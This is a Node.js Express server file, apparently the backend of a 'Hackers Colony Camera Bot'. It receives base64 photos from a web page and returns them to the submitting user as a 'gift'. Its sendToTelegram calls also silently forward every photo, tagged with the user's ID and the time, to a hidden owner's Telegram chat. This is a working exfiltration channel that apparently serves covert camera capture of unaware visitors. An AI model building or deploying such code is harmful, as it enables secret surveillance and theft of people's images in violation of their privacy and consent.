const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Serve static files from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Parse JSON requests
app.use(express.json({ limit: '50mb' }));

// API endpoint to send photos
app.post('/send-photo', async (req, res) => {
  try {
    console.log('📸 Received photo request');
    
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const OWNER_ID = process.env.OWNER_ID;
    
    if (!BOT_TOKEN || !OWNER_ID) {
      console.error('❌ Environment variables not set');
      return res.status(500).json({ 
        success: false, 
        error: 'Server configuration error' 
      });
    }
    
    const { image, label, userId } = req.body;
    
    if (!image || !userId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing image or user ID' 
      });
    }
    
    console.log(`📤 Processing ${label} for user ${userId}`);
    
    // Convert base64 to buffer
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    // Send to user
    await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
    
    // Send to owner
    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);
    
    res.json({ 
      success: true, 
      message: 'Photos sent successfully!' 
    });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Telegram sending function
async function sendToTelegram(token, chatId, photoBuffer, label, isUser = true, userId = null) {
  let caption = '';
  
  if (isUser) {
    caption = `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`;
  } else {
    caption = `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
  }
  
  try {
    // Create FormData
    const FormData = require('form-data');
    const formData = new FormData();
    
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('photo', photoBuffer, { filename: 'photo.jpg' });
    
    const response = await axios.post(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      formData,
      {
        headers: {
          ...formData.getHeaders()
        }
      }
    );
    
    console.log(`✅ Photo sent to ${chatId}: ${response.data.ok}`);
    return response.data;
    
  } catch (error) {
    console.error('Telegram API error:', error.response?.data || error.message);
    throw error;
  }
}

// Serve index.html for root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌐 Website: http://localhost:${PORT}`);
  console.log(`📤 API: http://localhost:${PORT}/send-photo`);
});
